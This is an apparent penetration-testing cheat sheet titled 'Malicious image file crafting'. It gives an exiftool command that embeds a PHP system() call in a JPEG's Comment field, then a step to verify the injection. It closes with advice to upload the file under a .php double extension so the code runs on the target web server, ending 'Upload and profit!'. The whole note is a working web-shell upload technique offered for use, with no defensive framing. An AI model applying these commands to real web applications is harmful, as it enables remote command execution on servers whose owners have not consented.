# Malicious image file crafting

### 1) .jpg

 - exiftool -Comment="<?php system(\"COMMAND\");?>" payload.jpg

 - exiftool payload.jpg (Verify that we injected PHP code in the malicious .jpg file)

 - Upload and profit! (Don't forget to put .php as the second extension for the PHP code to run. Overall, it depends on the web app)
